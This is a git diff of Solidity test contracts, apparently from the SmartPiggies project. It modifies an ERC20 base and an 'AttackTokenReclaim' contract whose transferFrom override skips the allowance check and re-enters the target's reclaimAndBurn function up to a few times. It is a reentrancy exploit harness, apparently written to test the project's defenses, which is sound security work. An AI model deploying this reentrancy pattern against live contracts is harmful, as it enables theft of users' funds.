@@ -160,10 +160,10 @@ contract ERC20 is IERC20 {
      * - `recipient` cannot be the zero address.
      * - the caller must have a balance of at least `amount`.
      */
-    //function transfer(address recipient, uint256 amount) public returns (bool) {
-    //    _transfer(msg.sender, recipient, amount);
-    //    return true;
-    //}
+    function transfer(address recipient, uint256 amount) public returns (bool) {
+        _transfer(msg.sender, recipient, amount);
+        return true;
+    }
 
     /**
      * @dev See {IERC20-allowance}.
@@ -196,11 +196,11 @@ contract ERC20 is IERC20 {
      * - the caller must have allowance for ``sender``'s tokens of at least
      * `amount`.
      */
-    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
-        _transfer(sender, recipient, amount);
-       // _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
-        return true;
-    }
+    //function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+    //    _transfer(sender, recipient, amount);
+    //   // _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
+    //    return true;
+    //}
 
     function mint(address receiver, uint256 amount)
       public
@@ -363,9 +363,13 @@ contract AttackTokenReclaim is ERC20 {
   uint256 public tokenId;
   address public smartpiggies;
   uint256 public strike = 10000;
+  bool public didCreate;
+  bool public didReclaim;
   bool public didAttack;
   bytes public returnData;
-  string public returnString;
+  string public returnCreateString;
+  string public returnReclaimString;
+  string public returnAttackString;
 
   constructor()
     ERC20("AttackToken", "ATTK")
@@ -378,39 +382,43 @@ contract AttackTokenReclaim is ERC20 {
     external
   {
 
-    //address(smartpiggies).call{gas: 10000000}(
-    address(smartpiggies).call.gas(10000000)(
-      abi.encodeWithSignature(
-        "createPiggy(address,address,address,uint256,uint256,uint256,uint256,bool,bool,bool)",
-        address(this),
-        address(this),
-        address(0),
-        100,
-        1,
-        strike++,
-        100,
-        false,
-        false,
-        false
-      )
-    );
-    count++;
   }
 
-  function attack()
+  function create()
+    public
+  {
+    bytes memory payload = abi.encodeWithSignature("createPiggy(address,address,address,uint256,uint256,uint256,uint256,bool,bool,bool)",address(this),address(this),address(0),100,1,12300,100,false,false,false);
+    (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);
+    returnCreateString = string(data);
+    didCreate = success;
+  }
+
+  function reclaim()
     public
   {
     bytes memory payload = abi.encodeWithSignature("reclaimAndBurn(uint256)", tokenId);
-   (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);
-    returnData = data;
-    returnString = string(data);
-    didAttack = success;
+    (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);
+    returnReclaimString = string(data);
+    didReclaim = success;
   }
 
-  function transfer(address recipient, uint256 amount) public returns (bool) {
-      _transfer(msg.sender, recipient, amount);
-      attack();
-      return true;
+  function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
+    attack();
+    _transfer(sender, recipient, amount);
+    // remove allowance check
+    return true;
+  }
+  
+  function attack()
+    public
+  {
+    if (count++ < 2) {
+      bytes memory payload = abi.encodeWithSignature("reclaimAndBurn(uint256)", tokenId);
+      (bool success, bytes memory data) = address(smartpiggies).call.gas(1000000)(payload);
+      returnData = data;
+      returnAttackString = string(data);
+      didAttack = success;
+    }
   }
 
   function setTokenId(uint256 _id)
